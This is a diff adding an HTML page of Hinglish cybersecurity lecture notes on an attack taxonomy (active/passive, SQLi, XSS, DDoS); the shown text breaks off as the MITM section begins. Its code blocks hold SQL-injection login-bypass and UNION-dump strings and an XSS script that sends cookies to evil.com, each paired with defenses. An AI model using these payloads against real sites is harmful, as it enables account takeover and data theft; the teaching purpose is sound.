@@ -1,0 +1,1310 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Attack Taxonomy — Cybersecurity Module 03</title>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700;900&family=IBM+Plex+Sans:ital,wght@0,300;0,400;0,500;0,600;1,300&family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg:        #060709;
+  --surface:   #0c0f14;
+  --surface2:  #121720;
+  --surface3:  #181f2c;
+  --border:    rgba(255,255,255,0.07);
+  --border2:   rgba(255,255,255,0.12);
+  --text:      #c8d4e8;
+  --muted:     #556070;
+  --active:    #00e5ff;
+  --passive:   #a78bfa;
+  --danger:    #ff3d57;
+  --warn:      #ff9f43;
+  --safe:      #26de81;
+  --sqli:      #ff6b6b;
+  --xss:       #ffd93d;
+  --ddos:      #ff5e57;
+  --mitm:      #c3a6ff;
+  --phish:     #ff9f43;
+  --csrf:      #48dbfb;
+  --rce:       #ff3d57;
+  --font-d: 'Orbitron', sans-serif;
+  --font-b: 'IBM Plex Sans', sans-serif;
+  --font-m: 'IBM Plex Mono', monospace;
+}
+
+*, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
+html { scroll-behavior: smooth; }
+
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: var(--font-b);
+  font-size: 15px;
+  line-height: 1.75;
+  overflow-x: hidden;
+  cursor: default;
+}
+
+/* MATRIX RAIN CANVAS */
+#matrix-canvas {
+  position: fixed;
+  top: 0; left: 0;
+  width: 100%; height: 100%;
+  z-index: 0;
+  opacity: 0.04;
+  pointer-events: none;
+}
+
+/* GRID OVERLAY */
+body::before {
+  content: '';
+  position: fixed;
+  inset: 0;
+  background-image:
+    linear-gradient(rgba(0,229,255,0.025) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(0,229,255,0.025) 1px, transparent 1px);
+  background-size: 40px 40px;
+  pointer-events: none;
+  z-index: 1;
+}
+
+/* NAV */
+nav {
+  position: fixed; top:0; left:0; right:0; z-index:200;
+  display: flex; align-items: center; gap:8px;
+  padding: 0 28px;
+  height: 52px;
+  background: rgba(6,7,9,0.92);
+  backdrop-filter: blur(20px);
+  border-bottom: 1px solid rgba(0,229,255,0.15);
+}
+
+.nav-logo {
+  font-family: var(--font-d);
+  font-size: 13px;
+  color: var(--active);
+  letter-spacing: 2px;
+  margin-right: 12px;
+  white-space: nowrap;
+}
+
+.nav-links { display:flex; gap:4px; flex-wrap:wrap; }
+.nav-links a {
+  font-family: var(--font-m);
+  font-size: 11px;
+  color: var(--muted);
+  text-decoration: none;
+  padding: 5px 10px;
+  border-radius: 4px;
+  border: 1px solid transparent;
+  letter-spacing: 0.5px;
+  transition: all 0.15s;
+}
+.nav-links a:hover { color: var(--active); border-color: rgba(0,229,255,0.3); background: rgba(0,229,255,0.04); }
+
+/* HERO */
+.hero {
+  position: relative; z-index: 2;
+  min-height: 100vh;
+  display: flex; flex-direction: column;
+  align-items: center; justify-content: center;
+  text-align: center;
+  padding: 100px 24px 60px;
+  overflow: hidden;
+}
+
+.hero-scan {
+  position: absolute;
+  top: 0; left: 0; right: 0;
+  height: 2px;
+  background: linear-gradient(90deg, transparent, var(--active), transparent);
+  animation: scan 4s linear infinite;
+  opacity: 0.6;
+}
+@keyframes scan { from { top:-2px; } to { top:100%; } }
+
+.h-module {
+  font-family: var(--font-m);
+  font-size: 11px;
+  letter-spacing: 4px;
+  color: var(--active);
+  border: 1px solid rgba(0,229,255,0.25);
+  background: rgba(0,229,255,0.05);
+  padding: 5px 20px;
+  border-radius: 2px;
+  margin-bottom: 36px;
+  animation: fadein 0.7s ease both;
+}
+
+.hero h1 {
+  font-family: var(--font-d);
+  font-size: clamp(38px, 8vw, 100px);
+  font-weight: 900;
+  line-height: 0.9;
+  letter-spacing: 4px;
+  animation: fadein 0.8s ease 0.1s both;
+  margin-bottom: 8px;
+}
+
+.hero h1 .l1 { display:block; color: var(--text); }
+.hero h1 .l2 { display:block; color: var(--danger); text-shadow: 0 0 40px rgba(255,61,87,0.4); }
+.hero h1 .l3 {
+  display: block;
+  font-size: 0.32em;
+  letter-spacing: 8px;
+  color: transparent;
+  -webkit-text-stroke: 1px var(--muted);
+  margin-top: 12px;
+}
+
+.hero-desc {
+  font-size: 16px;
+  color: var(--muted);
+  max-width: 620px;
+  margin: 28px auto 40px;
+  font-weight: 300;
+  animation: fadein 0.9s ease 0.2s both;
+}
+.hero-desc em { color: var(--text); font-style: normal; font-weight: 500; }
+
+.hero-stats {
+  display: flex; gap: 40px; flex-wrap:wrap; justify-content:center;
+  animation: fadein 1s ease 0.3s both;
+  margin-bottom: 40px;
+}
+.stat { text-align:center; }
+.stat-num {
+  font-family: var(--font-d);
+  font-size: 32px;
+  font-weight: 700;
+  line-height: 1;
+  background: linear-gradient(135deg, var(--active), var(--passive));
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+}
+.stat-label { font-family: var(--font-m); font-size: 10px; letter-spacing: 2px; color: var(--muted); margin-top: 4px; }
+
+.scroll-cue {
+  position: absolute; bottom: 28px; left: 50%; transform: translateX(-50%);
+  font-family: var(--font-m); font-size: 11px; letter-spacing: 2px; color: var(--muted);
+  display: flex; flex-direction:column; align-items:center; gap: 8px;
+  animation: blink 2s ease-in-out infinite;
+}
+@keyframes blink { 0%,100%{opacity:0.3} 50%{opacity:1} }
+@keyframes fadein { from{opacity:0;transform:translateY(20px)} to{opacity:1;transform:translateY(0)} }
+
+/* CONTENT */
+.wrap { max-width: 1080px; margin: 0 auto; padding: 0 24px; position: relative; z-index:2; }
+
+/* SECTION TITLE */
+.sec-title {
+  padding: 72px 0 32px;
+}
+.sec-title .stag {
+  font-family: var(--font-m);
+  font-size: 11px; letter-spacing: 3px;
+  color: var(--active);
+  margin-bottom: 10px;
+}
+.sec-title h2 {
+  font-family: var(--font-d);
+  font-size: clamp(28px, 5vw, 52px);
+  font-weight: 700;
+  letter-spacing: 3px;
+  color: var(--text);
+  line-height: 1;
+}
+.sec-title .sdesc { font-size: 14px; color: var(--muted); margin-top: 10px; max-width: 600px; }
+
+/* ─────────────────────────────
+   ACTIVE vs PASSIVE SPLIT
+───────────────────────────── */
+.ap-split {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 20px;
+  margin-bottom: 64px;
+}
+@media(max-width:680px){.ap-split{grid-template-columns:1fr;}}
+
+.ap-card {
+  border-radius: 16px;
+  padding: 32px;
+  border: 1px solid;
+  position: relative;
+  overflow: hidden;
+}
+.ap-card::before {
+  content: '';
+  position: absolute;
+  top: 0; left: 0; right: 0;
+  height: 3px;
+}
+.ap-card.active-card {
+  background: linear-gradient(135deg, rgba(255,61,87,0.06), rgba(255,61,87,0.02));
+  border-color: rgba(255,61,87,0.2);
+}
+.ap-card.active-card::before { background: var(--danger); box-shadow: 0 0 20px var(--danger); }
+.ap-card.passive-card {
+  background: linear-gradient(135deg, rgba(167,139,250,0.06), rgba(167,139,250,0.02));
+  border-color: rgba(167,139,250,0.2);
+}
+.ap-card.passive-card::before { background: var(--passive); box-shadow: 0 0 20px var(--passive); }
+
+.ap-label {
+  font-family: var(--font-d);
+  font-size: 22px;
+  font-weight: 700;
+  letter-spacing: 3px;
+  margin-bottom: 6px;
+}
+.lbl-active { color: var(--danger); }
+.lbl-passive { color: var(--passive); }
+
+.ap-def {
+  font-size: 13px; color: #889aaa; line-height: 1.8;
+  background: rgba(0,0,0,0.25); border-radius: 8px; padding: 12px 14px;
+  margin: 14px 0;
+  border-left: 2px solid rgba(255,255,255,0.08);
+  border-radius: 0 8px 8px 0;
+}
+.ap-def strong { color: var(--text); }
+
+.ap-list { list-style: none; display: flex; flex-direction: column; gap: 8px; margin-top: 14px; }
+.ap-list li {
+  font-size: 13px; color: #7a8eaa; padding: 8px 12px;
+  background: rgba(0,0,0,0.2); border-radius: 6px;
+  display: flex; align-items: center; gap: 10px;
+}
+.ap-list li .dot {
+  width: 6px; height: 6px; border-radius: 50%; flex-shrink: 0;
+}
+.dot-active { background: var(--danger); box-shadow: 0 0 6px var(--danger); }
+.dot-passive { background: var(--passive); box-shadow: 0 0 6px var(--passive); }
+
+/* ─────────────────────────────
+   ATTACK CARDS
+───────────────────────────── */
+.attack-block { margin-bottom: 56px; scroll-margin-top: 70px; }
+
+.attack-header {
+  display: flex; align-items: center; gap: 16px;
+  margin-bottom: 20px;
+  padding-bottom: 14px;
+  border-bottom: 1px solid var(--border);
+}
+
+.attack-icon {
+  width: 52px; height: 52px; border-radius: 10px;
+  display: flex; align-items:center; justify-content:center;
+  font-size: 22px; flex-shrink: 0;
+}
+
+.atk-meta { flex:1; }
+.atk-type {
+  font-family: var(--font-m);
+  font-size: 10px; letter-spacing: 2px; text-transform: uppercase;
+  margin-bottom: 4px;
+}
+.atk-name {
+  font-family: var(--font-d);
+  font-size: clamp(20px, 3vw, 28px);
+  font-weight: 700;
+  letter-spacing: 2px;
+  line-height: 1;
+}
+
+.severity-badge {
+  font-family: var(--font-m);
+  font-size: 11px; letter-spacing: 1px;
+  padding: 4px 12px; border-radius: 4px; border: 1px solid;
+  align-self: flex-start;
+}
+.sev-critical { color: var(--danger); border-color: rgba(255,61,87,0.4); background: rgba(255,61,87,0.08); }
+.sev-high     { color: var(--warn); border-color: rgba(255,159,67,0.4); background: rgba(255,159,67,0.08); }
+.sev-medium   { color: var(--xss); border-color: rgba(255,217,61,0.3); background: rgba(255,217,61,0.06); }
+
+.attack-body {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 16px;
+}
+@media(max-width:680px){ .attack-body{grid-template-columns:1fr;} }
+
+.atk-card {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  padding: 20px;
+}
+.atk-card.full { grid-column: 1/-1; }
+
+.atk-card-label {
+  font-family: var(--font-m);
+  font-size: 10px; letter-spacing: 2px; text-transform: uppercase;
+  margin-bottom: 10px;
+  opacity: 0.5;
+}
+
+.atk-def {
+  font-size: 13.5px; color: #c0cfe0; line-height: 1.8;
+}
+
+.atk-desc { font-size: 13.5px; color: #7a8eaa; line-height: 1.8; }
+.atk-desc em { color: var(--text); font-style: normal; }
+
+/* CODE BLOCK */
+.code-block {
+  background: #030508;
+  border: 1px solid rgba(0,229,255,0.1);
+  border-radius: 10px;
+  padding: 16px;
+  margin-top: 0;
+  overflow-x: auto;
+  grid-column: 1/-1;
+}
+.code-block .code-label {
+  font-family: var(--font-m);
+  font-size: 10px; letter-spacing: 2px; text-transform: uppercase;
+  color: var(--active); opacity: 0.7; margin-bottom: 10px;
+  display: flex; align-items:center; gap: 8px;
+}
+.code-block .code-label::before {
+  content: ''; display:inline-block; width: 8px; height: 8px;
+  border-radius: 50%; background: var(--active);
+  box-shadow: 0 0 8px var(--active); animation: pulse 2s ease-in-out infinite;
+}
+@keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.4} }
+
+pre {
+  font-family: var(--font-m);
+  font-size: 12.5px;
+  line-height: 1.7;
+  color: #8899bb;
+  white-space: pre;
+}
+.kw { color: var(--danger); }
+.str { color: var(--safe); }
+.cmt { color: var(--muted); font-style: italic; }
+.hl  { color: var(--active); }
+.warn-c { color: var(--warn); }
+
+/* EXAMPLE FLOW */
+.flow-steps {
+  display: flex; flex-direction: column; gap: 0;
+  grid-column: 1/-1;
+}
+.flow-step {
+  display: flex; gap: 16px; align-items: flex-start;
+  padding: 14px 0;
+  border-bottom: 1px solid rgba(255,255,255,0.04);
+}
+.flow-step:last-child { border-bottom: none; }
+.step-num {
+  font-family: var(--font-d);
+  font-size: 11px;
+  width: 28px; height: 28px; border-radius: 6px;
+  display: flex; align-items:center; justify-content:center;
+  flex-shrink: 0;
+  font-weight: 700;
+}
+.step-content { flex: 1; }
+.step-title { font-weight: 600; font-size: 13.5px; margin-bottom: 3px; }
+.step-desc { font-size: 12.5px; color: var(--muted); line-height: 1.65; }
+
+/* IMPACT + DEFENSE TAGS */
+.tag-row { display: flex; flex-wrap:wrap; gap: 8px; margin-top: 4px; }
+.tag {
+  font-family: var(--font-m);
+  font-size: 11px; padding: 3px 10px;
+  border-radius: 4px; border: 1px solid rgba(255,255,255,0.08);
+  color: var(--muted);
+}
+.tag.impact { border-color: rgba(255,61,87,0.3); color: #ff8099; background: rgba(255,61,87,0.06); }
+.tag.defense { border-color: rgba(38,222,129,0.3); color: #26de81; background: rgba(38,222,129,0.06); }
+
+/* DIVIDER */
+.atk-divider {
+  height: 1px;
+  background: linear-gradient(90deg, transparent, var(--border2), transparent);
+  margin: 8px 0 56px;
+}
+
+/* TAXONOMY TREE */
+.tree-wrap {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 16px;
+  padding: 32px;
+  margin-bottom: 64px;
+  overflow-x: auto;
+}
+.tree-title { font-family: var(--font-d); font-size: 18px; letter-spacing: 2px; margin-bottom: 24px; color: var(--active); }
+
+.tree { list-style:none; }
+.tree li { margin: 4px 0; }
+.tree > li > .tnode { font-family: var(--font-d); font-size: 13px; letter-spacing: 1px; color: var(--text); }
+.tree ul { list-style:none; margin-left: 24px; border-left: 1px dashed rgba(255,255,255,0.08); padding-left: 16px; margin-top: 4px; }
+.tree ul li { margin: 3px 0; }
+.tnode {
+  display: inline-flex; align-items:center; gap: 8px;
+  font-family: var(--font-m); font-size: 12px;
+  color: var(--muted); padding: 3px 0;
+  cursor: pointer;
+  transition: color 0.15s;
+}
+.tnode:hover { color: var(--text); }
+.tnode .tpill {
+  font-size: 10px; padding: 1px 7px; border-radius: 3px;
+  font-family: var(--font-m);
+}
+
+/* QUIZ */
+.quiz-wrap {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-top: 2px solid var(--active);
+  border-radius: 0 0 16px 16px;
+  padding: 36px;
+  margin-bottom: 64px;
+}
+.quiz-title { font-family: var(--font-d); font-size: 28px; letter-spacing: 2px; margin-bottom: 6px; }
+.quiz-sub { font-size: 13px; color: var(--muted); margin-bottom: 28px; font-family: var(--font-m); }
+
+.qblock { background: var(--surface2); border: 1px solid var(--border); border-radius: 10px; padding: 20px; margin-bottom: 12px; }
+.qtxt { font-weight: 500; font-size: 14.5px; margin-bottom: 14px; color: var(--text); }
+.qopts { display: flex; flex-direction:column; gap: 7px; }
+.qbtn {
+  padding: 9px 15px; border-radius: 6px; border: 1px solid var(--border);
+  cursor: pointer; font-size: 13px; font-family: var(--font-b);
+  transition: all 0.15s; background: transparent; color: var(--text); text-align: left;
+}
+.qbtn:hover { border-color: rgba(0,229,255,0.3); background: rgba(0,229,255,0.04); }
+.qbtn.correct { border-color: var(--safe); background: rgba(38,222,129,0.08); color: var(--safe); }
+.qbtn.wrong   { border-color: var(--danger); background: rgba(255,61,87,0.08); color: var(--danger); }
+.qfb { margin-top: 10px; font-size: 13px; padding: 9px 13px; border-radius: 6px; display:none; font-family: var(--font-m); }
+.qfb.show { display:block; }
+.qfb.ok  { background: rgba(38,222,129,0.07); color: var(--safe); border: 1px solid rgba(38,222,129,0.2); }
+.qfb.bad { background: rgba(255,61,87,0.07); color: var(--danger); border: 1px solid rgba(255,61,87,0.2); }
+
+/* FOOTER */
+footer {
+  border-top: 1px solid rgba(0,229,255,0.1);
+  padding: 48px 24px 36px;
+  text-align: center;
+  position: relative; z-index:2;
+}
+.cr-box {
+  display: inline-flex; flex-direction:column; align-items:center; gap: 6px;
+  background: var(--surface);
+  border: 1px solid rgba(0,229,255,0.12);
+  border-radius: 10px;
+  padding: 20px 40px;
+  margin-bottom: 16px;
+}
+.cr-label { font-family: var(--font-m); font-size: 10px; letter-spacing: 3px; color: var(--muted); text-transform:uppercase; }
+.cr-name  { font-family: var(--font-d); font-size: 22px; letter-spacing: 3px; color: var(--active); }
+.cr-sub   { font-family: var(--font-m); font-size: 11px; color: var(--muted); }
+.cr-warn  { font-family: var(--font-m); font-size: 11px; color: #3a4560; margin-top: 8px; }
+
+/* FADE */
+.fi { opacity:0; transform:translateY(24px); transition: opacity 0.6s ease, transform 0.6s ease; }
+.fi.vis { opacity:1; transform:translateY(0); }
+
+@media(max-width:560px){
+  nav { padding: 0 16px; }
+  .nav-links a { font-size:10px; padding: 4px 7px; }
+  .quiz-wrap, .tree-wrap { padding: 22px 18px; }
+  .ap-card { padding: 22px 18px; }
+  .atk-card { padding: 16px; }
+}
+</style>
+</head>
+<body>
+
+<canvas id="matrix-canvas"></canvas>
+
+<nav>
+  <span class="nav-logo">ATK//TAX</span>
+  <div class="nav-links">
+    <a href="#ap">Active/Passive</a>
+    <a href="#sqli">SQLi</a>
+    <a href="#xss">XSS</a>
+    <a href="#ddos">DDoS</a>
+    <a href="#mitm">MITM</a>
+    <a href="#phish">Phishing</a>
+    <a href="#csrf">CSRF</a>
+    <a href="#rce">RCE</a>
+    <a href="#tree">Tree</a>
+    <a href="#quiz">Quiz</a>
+  </div>
+</nav>
+
+<!-- HERO -->
+<div class="hero">
+  <div class="hero-scan"></div>
+  <div class="h-module">MODULE 03 // CYBERSECURITY NOTES // BHANU PRATAP SINGH RAJPUROHIT</div>
+  <h1>
+    <span class="l1">ATTACK</span>
+    <span class="l2">TAXONOMY</span>
+    <span class="l3">ACTIVE · PASSIVE · WEB · NETWORK</span>
+  </h1>
+  <p class="hero-desc">
+    Har cyberattack ka ek <em>type</em> hota hai, ek <em>method</em> hota hai, ek <em>target</em> hota hai.
+    Samjho kaun sa attack kaise kaam karta hai — toh defend bhi kar sakte ho.
+  </p>
+  <div class="hero-stats">
+    <div class="stat"><div class="stat-num">2</div><div class="stat-label">Main Categories</div></div>
+    <div class="stat"><div class="stat-num">7+</div><div class="stat-label">Attack Types</div></div>
+    <div class="stat"><div class="stat-num">20+</div><div class="stat-label">Real Examples</div></div>
+    <div class="stat"><div class="stat-num">30+</div><div class="stat-label">Defenses</div></div>
+  </div>
+  <div class="scroll-cue">▼ &nbsp; SCROLL TO BEGIN</div>
+</div>
+
+<div class="wrap">
+
+  <!-- ── ACTIVE vs PASSIVE ── -->
+  <div id="ap" class="sec-title fi">
+    <div class="stag">// 03-A &nbsp; FOUNDATION</div>
+    <h2>ACTIVE vs PASSIVE</h2>
+    <p class="sdesc">Sabse pehle samjho — attacks do categories mein hote hain. Ye fundamental hai baaki sab ke liye.</p>
+  </div>
+
+  <div class="ap-split fi">
+    <div class="ap-card active-card">
+      <div class="ap-label lbl-active">⚔ ACTIVE ATTACKS</div>
+      <div class="ap-def">
+        <strong>Definition:</strong> An active attack involves direct interaction with the target system — modifying data, disrupting services, or gaining unauthorized access. The attacker's presence can often be detected.
+      </div>
+      <p style="font-size:13px;color:#7a8eaa;margin:10px 0 14px;">
+        Ye attacks "kuch karte hain" — data modify karte hain, system todne ki koshish karte hain, ya directly attack karte hain. Noise create hoti hai, detectible hote hain lekin zyada damage karte hain.
+      </p>
+      <ul class="ap-list">
+        <li><span class="dot dot-active"></span>SQL Injection — database mein malicious code inject karna</li>
+        <li><span class="dot dot-active"></span>DDoS — server ko requests se overwhelm karna</li>
+        <li><span class="dot dot-active"></span>Ransomware — files encrypt karke ransom maangna</li>
+        <li><span class="dot dot-active"></span>Brute Force — password guess karte rehna</li>
+        <li><span class="dot dot-active"></span>Session Hijacking — active session churaana</li>
+      </ul>
+    </div>
+    <div class="ap-card passive-card">
+      <div class="ap-label lbl-passive">👁 PASSIVE ATTACKS</div>
+      <div class="ap-def">
+        <strong>Definition:</strong> A passive attack involves secretly monitoring or eavesdropping on communications without altering data or disrupting services. The attacker observes silently — very hard to detect.
+      </div>
+      <p style="font-size:13px;color:#7a8eaa;margin:10px 0 14px;">
+        Ye attacks "sirf dekhte hain" — data modify nahi karte. Silently information gather karte hain. Zyada dangerous isliye hai kyunki pata hi nahi chalta ki koi sun raha hai!
+      </p>
+      <ul class="ap-list">
+        <li><span class="dot dot-passive"></span>Packet Sniffing — network traffic monitor karna</li>
+        <li><span class="dot dot-passive"></span>Eavesdropping — unencrypted communications sunna</li>
+        <li><span class="dot dot-passive"></span>Traffic Analysis — patterns se information nikalna</li>
+        <li><span class="dot dot-passive"></span>Keylogging — keystrokes silently record karna</li>
+        <li><span class="dot dot-passive"></span>Port Scanning — open ports/services map karna</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="atk-divider"></div>
+
+  <!-- ── SQL INJECTION ── -->
+  <div id="sqli" class="attack-block fi">
+    <div class="attack-header">
+      <div class="attack-icon" style="background:rgba(255,107,107,0.12);border:1px solid rgba(255,107,107,0.25);">💉</div>
+      <div class="atk-meta">
+        <div class="atk-type" style="color:var(--sqli)">Web Attack · Active · OWASP #3</div>
+        <div class="atk-name" style="color:var(--sqli)">SQL INJECTION</div>
+      </div>
+      <span class="severity-badge sev-critical">CRITICAL</span>
+    </div>
+    <div class="attack-body">
+      <div class="atk-card">
+        <div class="atk-card-label">📖 Definition</div>
+        <div class="atk-def">SQL Injection (SQLi) is an attack technique where malicious SQL statements are inserted into input fields, manipulating the backend database to reveal, modify, or delete data without authorization.</div>
+      </div>
+      <div class="atk-card">
+        <div class="atk-card-label">🤔 Hinglish Explanation</div>
+        <div class="atk-desc">
+          Socho ek website hai jahan login form hai. Tum username box mein apna naam likhte ho, aur website database se check karti hai. <em>SQL injection mein hacker normal text ki jagah SQL code likhta hai</em> — aur database usse command samajh ke execute kar deta hai!
+        </div>
+      </div>
+      <div class="code-block">
+        <div class="code-label">Attack Example — Login Bypass</div>
+        <pre><span class="cmt">-- Normal login query:</span>
+SELECT * FROM users WHERE username='<span class="str">admin</span>' AND password='<span class="str">pass123</span>';
+
+<span class="cmt">-- Hacker enters in username field:</span>
+<span class="warn-c">admin' OR '1'='1</span>
+
+<span class="cmt">-- Resulting query (always TRUE = bypass login):</span>
+SELECT * FROM users WHERE username='<span class="hl">admin' OR '1'='1</span>' AND password='<span class="str">anything</span>';
+
+<span class="cmt">-- Data dump attack:</span>
+<span class="warn-c">' UNION SELECT username, password FROM users--</span>
+<span class="cmt">-- Dumps entire user database!</span></pre>
+      </div>
+      <div class="atk-card">
+        <div class="atk-card-label">💥 Impact</div>
+        <div class="tag-row">
+          <span class="tag impact">Data theft</span>
+          <span class="tag impact">Auth bypass</span>
+          <span class="tag impact">DB deletion</span>
+          <span class="tag impact">Admin access</span>
+        </div>
+      </div>
+      <div class="atk-card">
+        <div class="atk-card-label">🛡️ Defense</div>
+        <div class="tag-row">
+          <span class="tag defense">Prepared statements</span>
+          <span class="tag defense">Input validation</span>
+          <span class="tag defense">WAF</span>
+          <span class="tag defense">Least privilege DB</span>
+        </div>
+      </div>
+      <div class="atk-card full">
+        <div class="atk-card-label">🌍 Real Example</div>
+        <div class="atk-desc">2009 mein Heartland Payment Systems pe SQLi attack hua — <em>130 million credit card numbers</em> chori ho gaye. Ye US history ka sabse bada data breach tha at that time. Tool used: custom SQLi script.</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="atk-divider"></div>
+
+  <!-- ── XSS ── -->
+  <div id="xss" class="attack-block fi">
+    <div class="attack-header">
+      <div class="attack-icon" style="background:rgba(255,217,61,0.1);border:1px solid rgba(255,217,61,0.2);">⚡</div>
+      <div class="atk-meta">
+        <div class="atk-type" style="color:var(--xss)">Web Attack · Active · Client-Side</div>
+        <div class="atk-name" style="color:var(--xss)">CROSS-SITE SCRIPTING (XSS)</div>
+      </div>
+      <span class="severity-badge sev-high">HIGH</span>
+    </div>
+    <div class="attack-body">
+      <div class="atk-card">
+        <div class="atk-card-label">📖 Definition</div>
+        <div class="atk-def">Cross-Site Scripting (XSS) is a web vulnerability that allows attackers to inject malicious client-side scripts (usually JavaScript) into web pages viewed by other users, stealing their session data or performing actions on their behalf.</div>
+      </div>
+      <div class="atk-card">
+        <div class="atk-card-label">🤔 Hinglish Explanation</div>
+        <div class="atk-desc">
+          SQLi server ko attack karta hai, <em>XSS browser ko attack karta hai</em>. Hacker malicious JavaScript ek website pe plant karta hai. Jab koi user wo page kholta hai, unka browser wo script run karta hai — aur hacker ko unka session cookie, passwords ya personal data mil jaata hai!
+        </div>
+      </div>
+      <div class="code-block">
+        <div class="code-label">Stored XSS — Comment Box Attack</div>
+        <pre><span class="cmt">-- Hacker posts this as a comment on a forum:</span>
+<span class="warn-c">&lt;script&gt;
+  document.location='https://evil.com/steal?c='+document.cookie;
+&lt;/script&gt;</span>
+
+<span class="cmt">-- Victim opens that page → their cookie sent to hacker!</span>
+<span class="cmt">-- Hacker uses cookie → logs in AS the victim</span>
+
+<span class="cmt">-- Reflected XSS (URL-based):</span>
+<span class="hl">https://bank.com/search?q=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span>
+<span class="cmt">-- If unfiltered, runs in victim's browser</span></pre>
+      </div>
+      <div class="atk-card">
+        <div class="atk-card-label">Types of XSS</div>
+        <div class="atk-desc" style="font-size:13px;">
+          <strong style="color:var(--xss)">Stored XSS</strong> — Database mein save hoti hai, sab visitors ko affect karti hai.<br>
+          <strong style="color:var(--xss)">Reflected XSS</strong> — URL mein hoti hai, specific victim ko target karte hain.<br>
+          <strong style="color:var(--xss)">DOM-based XSS</strong> — Client-side JavaScript ke through hoti hai, server involved nahi.
+        </div>
+      </div>
+      <div class="atk-card">
+        <div class="atk-card-label">💥 Impact</div>
+        <div class="tag-row">
+          <span class="tag impact">Session hijack</span>
+          <span class="tag impact">Credential theft</span>
+          <span class="tag impact">Defacement</span>
+          <span class="tag impact">Malware spread</span>
+        </div>
+      </div>
+      <div class="atk-card">
+        <div class="atk-card-label">🛡️ Defense</div>
+        <div class="tag-row">
+          <span class="tag defense">Output encoding</span>
+          <span class="tag defense">CSP headers</span>
+          <span class="tag defense">Input sanitization</span>
+          <span class="tag defense">HTTPOnly cookies</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="atk-divider"></div>
+
+  <!-- ── DDoS ── -->
+  <div id="ddos" class="attack-block fi">
+    <div class="attack-header">
+      <div class="attack-icon" style="background:rgba(255,94,87,0.1);border:1px solid rgba(255,94,87,0.25);">🌊</div>
+      <div class="atk-meta">
+        <div class="atk-type" style="color:var(--ddos)">Network Attack · Active · Availability</div>
+        <div class="atk-name" style="color:var(--ddos)">DISTRIBUTED DENIAL OF SERVICE</div>
+      </div>
+      <span class="severity-badge sev-critical">CRITICAL</span>
+    </div>
+    <div class="attack-body">
+      <div class="atk-card">
+        <div class="atk-card-label">📖 Definition</div>
+        <div class="atk-def">A DDoS attack floods a target server, network, or service with massive traffic from multiple distributed sources (a botnet), overwhelming its capacity and making it unavailable to legitimate users.</div>
+      </div>
+      <div class="atk-card">
+        <div class="atk-card-label">🤔 Hinglish Explanation</div>
+        <div class="atk-desc">
+          Soch ek restaurant hai jo 100 log serve kar sakta hai. Agar <em>1 lakh log ek saath aakar tables rok lein</em> toh real customers nahi aa sakte. DDoS exactly yahi karta hai — lakhs of infected computers (botnet) ek server pe fake requests bhejte hain jab tak crash na ho jaaye.
+        </div>
+      </div>
+      <div class="atk-card full">
+        <div class="atk-card-label">📋 Attack Flow — How DDoS Happens</div>
+        <div class="flow-steps">
+          <div class="flow-step">
+            <div class="step-num" style="background:rgba(255,94,87,0.12);color:var(--ddos);">1</div>
+            <div class="step-content">
+              <div class="step-title">Botnet Creation</div>
+              <div class="step-desc">Hacker pehle hazaron computers mein malware install karta hai bina owners ke pata chale. Ye sab "zombie" computers ban jaate hain — ek botnet.</div>
+            </div>
+          </div>
+          <div class="flow-step">
+            <div class="step-num" style="background:rgba(255,94,87,0.12);color:var(--ddos);">2</div>
+            <div class="step-content">
+              <div class="step-title">Command Issued</div>
+              <div class="step-desc">Hacker C&C (Command & Control) server se sabko signal deta hai — "abhi attack karo [target IP]".</div>
+            </div>
+          </div>
+          <div class="flow-step">
+            <div class="step-num" style="background:rgba(255,94,87,0.12);color:var(--ddos);">3</div>
+            <div class="step-content">
+              <div class="step-title">Traffic Flood</div>
+              <div class="step-desc">Lakhs of requests per second. SYN floods, UDP floods, HTTP floods — target ka bandwidth aur processing power exhaust ho jaata hai.</div>
+            </div>
+          </div>
+          <div class="flow-step">
+            <div class="step-num" style="background:rgba(255,94,87,0.12);color:var(--ddos);">4</div>
+            <div class="step-content">
+              <div class="step-title">Service Down</div>
+              <div class="step-desc">Real users "504 Gateway Timeout" ya "Service Unavailable" dekhte hain. Har minute downtime = lakhs ka nuksaan companies ke liye.</div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="atk-card">
+        <div class="atk-card-label">💥 Impact</div>
+        <div class="tag-row">
+          <span class="tag impact">Service outage</span>
+          <span class="tag impact">Revenue loss</span>
+          <span class="tag impact">Reputation damage</span>
+        </div>
+      </div>
+      <div class="atk-card">
+        <div class="atk-card-label">🛡️ Defense</div>
+        <div class="tag-row">
+          <span class="tag defense">Cloudflare / CDN</span>
+          <span class="tag defense">Rate limiting</span>
+          <span class="tag defense">Traffic analysis</span>
+          <span class="tag defense">BGP blackholing</span>
+        </div>
+      </div>
+      <div class="atk-card full">
+        <div class="atk-card-label">🌍 Real Example</div>
+        <div class="atk-desc">2020 mein AWS pe sabse bada DDoS attack — <em>2.3 Tbps traffic!</em> Ye aaj bhi record hai. GitHub pe 2018 mein 1.35 Tbps memcached amplification attack hua tha. India mein bhi kai government websites DDoS ke through down ki gayi hain.</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="atk-divider"></div>
+
+  <!-- ── MITM ── -->
+  <div id="mitm" class="attack-block fi">
+    <div class="attack-header">
+      <div class="attack-icon" style="background:rgba(195,166,255,0.1);border:1px solid rgba(195,166,255,0.25);">🎭</div>
+      <div class="atk-meta">
+        <div class="atk-type" style="color:var(--mitm)">Network Attack · Active+Passive · Interception</div>
